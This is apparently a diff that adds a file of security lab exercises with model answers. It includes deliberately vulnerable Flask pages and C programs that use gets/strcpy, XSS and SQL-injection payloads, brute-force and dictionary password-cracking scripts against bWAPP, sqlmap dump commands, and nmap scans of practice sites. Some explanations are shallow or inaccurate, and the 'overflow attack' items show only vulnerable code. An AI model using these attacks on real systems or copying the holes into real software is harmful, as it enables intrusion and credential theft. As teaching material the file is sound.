@@ -1,0 +1,658 @@
+
+
+ 1. Develop an E-Commerce web page that uses GET and POST methods. Identify and exploit vulnerabilities.
+mysql code
+-- Create database
+CREATE DATABASE ecommerce;
+
+-- Use the database
+USE ecommerce;
+
+-- Create table for products
+CREATE TABLE products (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    name VARCHAR(100),
+    price DECIMAL(10, 2)
+);
+
+-- Insert sample data
+INSERT INTO products (name, price) VALUES ('Laptop', 999.99);
+INSERT INTO products (name, price) VALUES ('Smartphone', 499.99);
+
+
+ Code for E-Commerce web page using Flask:
+
+from flask import Flask, request, render_template_string, redirect
+import mysql.connector
+
+app = Flask(__name__)
+
+# Database connection
+def get_db_connection():
+    connection = mysql.connector.connect(
+        host='localhost',
+        user='root',  # change to your mysql user
+        password='password',  # change to your mysql password
+        database='ecommerce'
+    )
+    return connection
+
+@app.route('/')
+def index():
+    connection = get_db_connection()
+    cursor = connection.cursor(dictionary=True)
+    cursor.execute('SELECT * FROM products')
+    products = cursor.fetchall()
+    cursor.close()
+    connection.close()
+    return render_template_string('''
+        <h1>Products</h1>
+        <ul>
+            {% for product in products %}
+            <li>{{ product.name }} - ${{ product.price }}
+                <form action="/buy" method="post">
+                    <input type="hidden" name="product_id" value="{{ product.id }}">
+                    <button type="submit">Buy</button>
+                </form>
+            </li>
+            {% endfor %}
+        </ul>
+    ''', products=products)
+
+@app.route('/buy', methods=['POST'])
+def buy():
+    product_id = request.form.get('product_id')
+    return f'You bought product with id {product_id}'
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+ Exploiting Vulnerabilities:
+
+- Cross-Site Scripting (XSS):
+  - Inject a script in form fields (e.g., `<script>alert('XSS')</script>`).
+  
+- SQL Injection:
+  - Modify the POST request to inject SQL commands if connected to a database.
+
+ 2. Implement a stack buffer overflow attack using a procedural language on the "Legacy Banking System". Explain the concept of stack buffer overflow and discuss techniques to prevent such attacks.
+
+ Explanation and Concept:
+- A stack buffer overflow occurs when more data is written to a buffer than it can hold, overwriting adjacent memory and potentially leading to arbitrary code execution.
+
+
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable_function(char *input) {
+    char buffer[50];
+    strcpy(buffer, input);
+    printf("Buffer content: %s\n", buffer);
+}
+
+int main() {
+    char user_input[100];
+    printf("Enter input: ");
+    gets(user_input);
+    vulnerable_function(user_input);
+    return 0;
+}
+
+
+ Preventing Techniques:
+- Use functions like `strncpy` instead of `strcpy`.
+- Implement stack canaries.
+- Enable ASLR (Address Space Layout Randomization).
+
+ 3. Create a Social media Web Page and Perform a reflected cross-site scripting (XSS) attack on it.
+
+ Code for Social Media Web Page:
+
+
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template_string('''
+        <form action="/search" method="get">
+            <input type="text" name="query">
+            <button type="submit">Search</button>
+        </form>
+    ''')
+
+@app.route('/search')
+def search():
+    query = request.args.get('query')
+    return f'Results for: {query}'
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+ Performing Reflected XSS:
+- Inject script in the query parameter, e.g., `http://127.0.0.1:5000/search?query=<script>alert('XSS')</script>`
+
+ 4. Create a Social media Web Page and Perform a Stored cross-site scripting (XSS) attack on it.
+Code for mysql:
+-- Create database
+CREATE DATABASE socialmedia;
+
+-- Use the database
+USE socialmedia;
+
+-- Create table for comments
+CREATE TABLE comments (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    comment TEXT
+);
+
+
+ Code for Social Media Web Page with Stored XSS:
+
+
+from flask import Flask, request, render_template_string, redirect, url_for
+import mysql.connector
+
+app = Flask(__name__)
+
+# Database connection
+def get_db_connection():
+    connection = mysql.connector.connect(
+        host='localhost',
+        user='root',  # change to your mysql user
+        password='password',  # change to your mysql password
+        database='socialmedia'
+    )
+    return connection
+
+@app.route('/')
+def index():
+    connection = get_db_connection()
+    cursor = connection.cursor(dictionary=True)
+    cursor.execute('SELECT * FROM comments')
+    comments = cursor.fetchall()
+    cursor.close()
+    connection.close()
+    return render_template_string('''
+        <form action="/comment" method="post">
+            <input type="text" name="comment">
+            <button type="submit">Post Comment</button>
+        </form>
+        <ul>
+            {% for comment in comments %}
+            <li>{{ comment.comment }}</li>
+            {% endfor %}
+        </ul>
+    ''', comments=comments)
+
+@app.route('/comment', methods=['POST'])
+def comment():
+    comment = request.form.get('comment')
+    connection = get_db_connection()
+    cursor = connection.cursor()
+    cursor.execute('INSERT INTO comments (comment) VALUES (%s)', (comment,))
+    connection.commit()
+    cursor.close()
+    connection.close()
+    return redirect(url_for('index'))
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+ Performing Stored XSS:
+- Post a comment with `<script>alert('XSS')</script>`
+
+ 5. Create Net Banking Web Page and Perform a reflected cross-site scripting (XSS) attack on it.
+
+ Code for Net Banking Web Page:
+
+
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return render_template_string('''
+        <form action="/login" method="get">
+            <input type="text" name="username">
+            <button type="submit">Login</button>
+        </form>
+    ''')
+
+@app.route('/login')
+def login():
+    username = request.args.get('username')
+    return f'Welcome, {username}'
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+ Performing Reflected XSS:
+- Inject script in the username parameter, e.g., `http://127.0.0.1:5000/login?username=<script>alert('XSS')</script>`
+
+ 6. Create Net Banking Web Page and Perform a Stored cross-site scripting (XSS) attack on it.
+
+ Code for Net Banking Web Page with Stored XSS:
+
+
+from flask import Flask, request, render_template_string, redirect, url_for
+
+app = Flask(__name__)
+messages = []
+
+@app.route('/')
+def index():
+    return render_template_string('''
+        <form action="/message" method="post">
+            <input type="text" name="message">
+            <button type="submit">Send Message</button>
+        </form>
+        <ul>
+            {% for message in messages %}
+            <li>{{ message }}</li>
+            {% endfor %}
+        </ul>
+    ''', messages=messages)
+
+@app.route('/message', methods=['POST'])
+def message():
+    message = request.form.get('message')
+    messages.append(message)
+    return redirect(url_for('index'))
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+ Performing Stored XSS:
+- Post a message with `<script>alert('XSS')</script>`
+
+ 7. Use NMAP to perform port scanning on the network of Tech Startup Inc. to locate malware and vulnerabilities.
+
+ Steps:
+
+1. Install NMAP:
+   - On Linux: `sudo apt-get install nmap`
+   - On Windows: Download and install from [Nmap.org](https://nmap.org/)
+
+2. Performing Scan:
+   
+   nmap -sV -O 192.168.1.0/24
+   
+
+   - `-sV`: Detect service versions.
+   - `-O`: Detect OS.
+   - `192.168.1.0/24`: Target network range.
+
+ 8. Implement a stack buffer overflow attack using a procedural language on the "Internal Inventory Management System".
+
+ Example in C:
+
+
+#include <stdio.h>
+#include <string.h>
+
+void process(char *input) {
+    char buffer[50];
+    strcpy(buffer, input);
+    printf("Processed input: %s\n", buffer);
+}
+
+int main() {
+    char input[100];
+    printf("Enter input: ");
+    gets(input);
+    process(input);
+    return 0;
+}
+
+
+ 9. Conduct a brute force password cracking attack on the login system of BWAPP. Username - User1234 and password will be a combination of letters a,b,c of length 5.
+
+ Code in Python using requests:
+
+
+import requests
+from itertools import product
+
+url = 'http://bwapp/login.php'
+username = 'User1234'
+chars = 'abc'
+length = 5
+
+def brute_force():
+    for attempt in product(chars, repeat=length):
+        password = ''.join(attempt)
+        data = {'username': username, 'password': password}
+        response = requests.post(url, data=data)
+        if 'Welcome' in response.text:
+            print(f'Password found: {password}')
+            break
+
+if __name__ == '__main__':
+    brute_force()
+
+
+ 10. Perform penetration testing on the "HR Management Software" to identify and exploit application vulnerabilities.
+
+ Tools and Techniques:
+
+- SQL Injection:
+  - Use sqlmap: `sqlmap -u "http://hrms.example.com/login" --data "username=admin&password=admin"`
+
+- Cross-Site Scripting (XSS):
+  - Inject payloads in form fields or URLs.
+
+- CSRF:
+  - Create a malicious HTML form to exploit CSRF vulnerabilities.
+
+ 11. Develop a "Blogging Platform" that uses GET and POST methods. Identify and exploit vulnerabilities.
+Code for mysql:
+-- Create database
+CREATE DATABASE blogging;
+
+-- Use the database
+USE blogging;
+
+-- Create table for posts
+CREATE TABLE posts (
+    id INT AUTO_INCREMENT PRIMARY KEY,
+    content TEXT
+);
+
+
+ Code for Blogging Platform:
+
+
+from flask import Flask, request, render_template_string, redirect
+import mysql.connector
+
+app = Flask(__name__)
+
+# Database connection
+def get_db_connection():
+    connection = mysql.connector.connect(
+        host='localhost',
+        user='root',  # change to your mysql user
+        password='password',  # change to your mysql password
+        database='blogging'
+    )
+    return connection
+
+@app.route('/')
+def index():
+    connection = get_db_connection()
+    cursor = connection.cursor(dictionary=True)
+    cursor.execute('SELECT * FROM posts')
+    posts = cursor.fetchall()
+    cursor.close()
+    connection.close()
+    return render_template_string('''
+        <form action="/post" method="post">
+            <input type="text" name="content">
+            <button type="submit">Post</button>
+        </form>
+        <ul>
+            {% for post in posts %}
+            <li>{{ post.content }}</li>
+            {% endfor %}
+        </ul>
+    ''', posts=posts)
+
+@app.route('/post', methods=['POST'])
+def post():
+    content = request.form.get('content')
+    connection = get_db_connection()
+    cursor = connection.cursor()
+    cursor.execute('INSERT INTO posts (content) VALUES (%s)', (content,))
+    connection.commit()
+    cursor.close()
+    connection.close()
+    return redirect('/')
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+
+ Exploiting Vulnerabilities:
+- XSS: Post content with `<script>alert('XSS')</script>`
+- SQL Injection: If connected to DB, try injecting SQL commands.
+
+ 12. Implement a stack buffer overflow attack on the "Food Delivery” application using a procedural language.
+
+ Example in C:
+
+
+#include <stdio.h>
+#include <string.h>
+
+void process_order(char *order) {
+    char buffer[50];
+    strcpy(buffer, order);
+    printf("Order processed: %s\n", buffer);
+}
+
+int main() {
+    char order[100];
+    printf("Enter your order: ");
+    gets(order);
+    process_order(order);
+    return 0;
+}
+
+
+ 13. Implement a stack buffer overflow attack “Financial Analysis Software" in a simulated environment using a procedural language, documenting each step of the process.
+
+ Example in C:
+
+
+#include <stdio.h>
+#include <string.h>
+
+void analyze(char *data) {
+    char buffer[50];
+    strcpy(buffer, data);
+    printf("Analysis result: %s\n", buffer);
+}
+
+int main() {
+    char data[100];
+    printf("Enter data for analysis: ");
+    gets(data);
+    analyze(data);
+    return 0;
+}
+
+ 14. Utilize NMAP to perform a port scan on the network of "Telecommunications Company".
+
+ Steps:
+
+1. Install NMAP:
+   - On Linux: `sudo apt-get install nmap`
+   - On Windows: Download and install from [Nmap.org](https://nmap.org/)
+
+2. Performing Scan:
+   
+   nmap -sV -O 192.168.2.0/24
+   
+
+   - `-sV`: Detect service versions.
+   - `-O`: Detect OS.
+   - `192.168.2.0/24`: Target network range.
+
+ 15. Conduct a dictionary attack password cracking attack on the BWAPP. Username - vuStudent.
+
+ Code in Python using requests and a dictionary file:
+
+
+import requests
+
+url = 'http://bwapp/login.php'
+username = 'vuStudent'
+
+def dictionary_attack(dictionary_file):
+    with open(dictionary_file, 'r') as f:
+        for password in f:
+            password = password.strip()
+            data = {'username': username, 'password': password}
+            response = requests.post(url, data=data)
+            if 'Welcome' in response.text:
+                print(f'Password found: {password}')
+                break
+
+if __name__ == '__main__':
+    dictionary_attack('dictionary.txt')
+
+
+ 16. Perform penetration testing on the network infrastructure of "Healthcare Provider", identifying and exploiting vulnerabilities.
+
+ Tools and Techniques:
+
+- NMAP:
+  - Port scan: `nmap -sV -O 192.168.3.0/24`
+
+- SQL Injection:
+  - Use sqlmap: `sqlmap -u "http://healthcare.example.com/login" --data "username=admin&password=admin"`
+
+- Cross-Site Scripting (XSS):
+  - Inject payloads in form fields or URLs.
+
+ 17. Investigate vulnerabilities in "Online Learning Management System", focusing on input validation and output encoding.
+
+ Steps:
+
+1. Input Validation:
+   - Test all input fields for SQL injection, XSS, and command injection.
+   - Use tools like Burp Suite to intercept and modify requests.
+
+2. Output Encoding:
+   - Ensure all outputs are properly encoded to prevent XSS.
+   - Review the code to check if output encoding is implemented.
+
+ 18. Implement a stack buffer overflow attack.
+
+ Example in C:
+
+
+#include <stdio.h>
+#include <string.h>
+
+void vulnerable(char *input) {
+    char buffer[50];
+    strcpy(buffer, input);
+    printf("Buffer content: %s\n", buffer);
+}
+
+int main() {
+    char input[100];
+    printf("Enter input: ");
+    gets(input);
+    vulnerable(input);
+    return 0;
+}
+
+
+ 19. Utilize NMAP to perform a port scan on the network of "Retail Chain".
+
+ Steps:
+
+1. Install NMAP:
+   - On Linux: `sudo apt-get install nmap`
+   - On Windows: Download and install from [Nmap.org](https://nmap.org/)
+
+2. Performing Scan:
+   
+   nmap -sV -O 192.168.4.0/24
+   
+
+   - `-sV`: Detect service versions.
+   - `-O`: Detect OS.
+   - `192.168.4.0/24`: Target network range.
+
+ 20. Perform penetration testing on "E-Commerce Platform" to identify vulnerabilities.
+
+ Tools and Techniques:
+
+- SQL Injection:
+  - Use sqlmap: `sqlmap -u "http://ecommerce.example.com/login" --data "username=admin&password=admin"`
+
+- Cross-Site Scripting (XSS):
+  - Inject payloads in form fields or URLs.
+
+- CSRF:
+  - Create a malicious HTML form to exploit CSRF vulnerabilities.
+
+ 21. Utilize NMAP to perform a port scan on the network of Altoro Mutual - [Altoro Mutual](http://altoro.testfire.net/).
+
+ Steps:
+
+1. Install NMAP:
+   - On Linux: `sudo apt-get install nmap`
+   - On Windows: Download and install from [Nmap.org](https://nmap.org/)
+
+2. Performing Scan:
+   
+   nmap -sV -O altoro.testfire.net
+   
+
+   - `-sV`: Detect service versions.
+   - `-O`: Detect OS.
+
+ 22. Utilize NMAP to perform a detailed port scan on the network of [testphp.vulnweb.com](http://testphp.vulnweb.com).
+
+ Steps:
+
+1. Install NMAP:
+   - On Linux: `sudo apt-get install nmap`
+   - On Windows: Download and install from [Nmap.org](https://nmap.org/)
+
+2. Performing Scan:
+   
+   nmap -sV -O testphp.vulnweb.com
+
+
+   - `-sV`: Detect service versions.
+   - `-O`: Detect OS.
+
+ 23. Perform penetration testing on "Customer Support Ticketing System" to identify vulnerabilities, such as XSS and CSRF vulnerabilities.
+
+ Tools and Techniques:
+
+- Cross-Site Scripting (XSS):
+  - Inject payloads in form fields or URLs.
+
+- CSRF:
+  - Create a malicious HTML form to exploit CSRF vulnerabilities.
+
+ 24. Find a way to log in as an admin without using the correct password on the "User Login Page" of Altoro Mutual - [Altoro Mutual](http://altoro.testfire.net/). Explain how you did it and how this could be prevented.
+
+ Steps:
+
+1. SQL Injection:
+   - Try injecting SQL commands in the login form.
+
+2. Example:
+   
+   Username: admin' OR '1'='1
+   Password: anything
+   
+
+3. Prevention:
+   - Use prepared statements.
+   - Implement input validation.
+
+ 25. Retrieve all user data from the "Customer Database" of Acuart website - [Acuart](http://testphp.vulnweb.com/index.php). Explain how you accomplished this and suggest a method to stop this unauthorized access.
+
+ Steps:
+
+1. SQL Injection:
+   - Use sqlmap to extract data: `sqlmap -u "http://testphp.vulnweb.com/index.php?id=1" --dump`
+
+2. Prevention:
+   - Use prepared statements.
+   - Implement input validation.
